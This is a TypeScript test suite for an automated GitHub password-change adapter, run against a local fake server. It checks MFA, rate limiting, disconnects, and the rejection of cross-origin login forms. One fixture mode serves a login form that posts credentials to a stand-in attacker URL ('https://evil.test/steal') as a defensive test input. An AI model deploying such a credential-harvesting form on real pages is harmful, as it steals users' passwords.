import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  createServer,
  type IncomingMessage,
  type ServerResponse,
} from 'node:http';
import { once } from 'node:events';
import { GithubSite } from '../../src/adapters/github-site.ts';
import { MemorySecrets } from '../../src/testing/fakes.ts';
async function fixture() {
  let password = 'OLD_SYNTHETIC';
  let signIns = 0;
  let malicious = false;
  let disconnectChange = false;
  let loginMode: 'normal' | 'cookie-only' | 'mfa' | 'rate-limited' = 'normal';
  const server = createServer((req, res) => {
    void handle(req, res).catch(() => {
      res.writeHead(500).end();
    });
  });
  async function handle(
    req: IncomingMessage,
    res: ServerResponse
  ): Promise<void> {
    res.setHeader('Content-Type', 'text/html');
    const url = requestPath(req);
    if (req.method === 'POST') {
      let body = '';
      for await (const chunk of req) body += String(chunk);
      const form = new URLSearchParams(body);
      if (url === '/session') {
        signIns++;
        loginResponse(res, { form, password, mode: loginMode });
      } else if (url === '/settings/password') {
        if (form.get('old_password') !== password) {
          res.writeHead(400).end();
          return;
        }
        password = form.get('new_password')!;
        changeResponse(res, disconnectChange);
      }
      return;
    }
    if (url === '/login') {
      res.end(
        `<form method="post" action="${malicious ? 'https://evil.test/steal' : '/session'}"><input id="login_field" name="login"><input id="password" name="password" type="password"><button>Sign in</button></form>`
      );
      return;
    }
    if (url === '/sessions/two-factor') {
      res.end(
        '<input autocomplete="one-time-code"><p>Complete the selected factor</p>'
      );
      return;
    }
    if (!authenticated(req)) {
      res.writeHead(302, { Location: '/login' }).end();
      return;
    }
    res.end(
      '<meta name="user-login" content="alice">' +
        successMessage(url) +
        '<form method="post" action="/settings/password"><input id="old_password" name="old_password" type="password"><input id="new_password" name="new_password" type="password"><input id="confirm_new_password" name="confirmation" type="password"><button>Update password</button></form>'
    );
  }
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  const address = server.address();
  assert.ok(address && typeof address !== 'string');
  const site = new GithubSite({
    accountId: 'synthetic',
    secrets: new MemorySecrets(),
    headless: true,
    fixtureOrigin: `http://127.0.0.1:${address.port}`,
  });
  return {
    site,
    signIns: () => signIns,
    disconnectChange: () => {
      disconnectChange = true;
    },
    loginMode: (mode: 'normal' | 'cookie-only' | 'mfa' | 'rate-limited') => {
      loginMode = mode;
    },
    malicious: () => {
      malicious = true;
    },
    close: async () => {
      await site.close();
      server.closeAllConnections();
      server.close();
    },
  };
}
void test('production GitHub adapter changes a password and verifies through a fresh context', async () => {
  const f = await fixture();
  try {
    assert.equal(
      await f.site.prepare({ username: 'alice', password: 'OLD_SYNTHETIC' }),
      'ready'
    );
    assert.equal(
      await f.site.change({
        old: { username: 'alice', password: 'OLD_SYNTHETIC' },
        replacement: 'NEW_SYNTHETIC_PASSWORD',
      }),
      'confirmed'
    );
    assert.equal(
      await f.site.verify({
        username: 'alice',
        password: 'NEW_SYNTHETIC_PASSWORD',
      }),
      'valid'
    );
    assert.equal(
      await f.site.verify({ username: 'alice', password: 'OLD_SYNTHETIC' }),
      'invalid'
    );
    assert.equal(f.signIns(), 3);
  } finally {
    await f.close();
  }
});
void test('cross-origin form action is rejected before secret filling/submission', async () => {
  const f = await fixture();
  try {
    f.malicious();
    await assert.rejects(
      f.site.verify({ username: 'alice', password: 'SECRET_CANARY' }),
      /invalid-input/
    );
    assert.equal(f.signIns(), 0);
  } finally {
    await f.close();
  }
});

function requestPath(request: IncomingMessage): string {
  return request.url ?? '/';
}
function authenticated(request: IncomingMessage): boolean {
  return request.headers.cookie?.includes('session=synthetic') ?? false;
}

function isChanged(url: string): boolean {
  return url.includes('changed=1');
}

function successMessage(url: string): string {
  return isChanged(url) ? '<p>Your password has been changed.</p>' : '';
}

function loginResponse(
  response: ServerResponse,
  input: { form: URLSearchParams; password: string; mode: string }
): void {
  if (input.mode === 'rate-limited') {
    response.writeHead(429, { 'Retry-After': '120' }).end('<p>Try later</p>');
    return;
  }
  if (input.mode === 'cookie-only') {
    response.end('<meta name="user-login" content="alice">');
    return;
  }
  if (input.form.get('password') !== input.password) {
    response.end('<p>Incorrect username or password</p>');
    return;
  }
  const location = input.mode === 'mfa' ? '/sessions/two-factor' : '/';
  const cookie =
    input.mode === 'mfa' ? 'challenge=synthetic' : 'session=synthetic';
  response
    .writeHead(302, {
      Location: location,
      'Set-Cookie': cookie + '; HttpOnly; SameSite=Strict; Path=/',
    })
    .end();
}
void test('an authenticated-looking response without password acceptance cannot verify a password', async () => {
  const f = await fixture();
  try {
    f.loginMode('cookie-only');
    assert.equal(
      await f.site.verify({ username: 'alice', password: 'WRONG_SYNTHETIC' }),
      'unknown'
    );
  } finally {
    await f.close();
  }
});
void test('headless MFA remains a challenge after accepted password submission', async () => {
  const f = await fixture();
  try {
    f.loginMode('mfa');
    assert.equal(
      await f.site.verify({ username: 'alice', password: 'OLD_SYNTHETIC' }),
      'challenge'
    );
  } finally {
    await f.close();
  }
});

void test('a rate-limited password response stays unknown without retrying authentication', async () => {
  const f = await fixture();
  try {
    f.loginMode('rate-limited');
    assert.equal(
      await f.site.verify({ username: 'alice', password: 'OLD_SYNTHETIC' }),
      'unknown'
    );
    assert.equal(f.signIns(), 1);
  } finally {
    await f.close();
  }
});
void test('remote password acceptance followed by disconnect is uncertain and fresh login can reconcile it', async () => {
  const f = await fixture();
  try {
    assert.equal(
      await f.site.prepare({ username: 'alice', password: 'OLD_SYNTHETIC' }),
      'ready'
    );
    f.disconnectChange();
    const result = await f.site
      .change({
        old: { username: 'alice', password: 'OLD_SYNTHETIC' },
        replacement: 'DISCONNECT_NEW_PASSWORD',
      })
      .catch(() => 'unknown');
    assert.equal(result, 'unknown');
    assert.equal(
      await f.site.verify({
        username: 'alice',
        password: 'DISCONNECT_NEW_PASSWORD',
      }),
      'valid'
    );
  } finally {
    await f.close();
  }
});

function changeResponse(response: ServerResponse, disconnect: boolean): void {
  if (disconnect) response.destroy();
  else response.writeHead(302, { Location: '/settings/admin?changed=1' }).end();
}
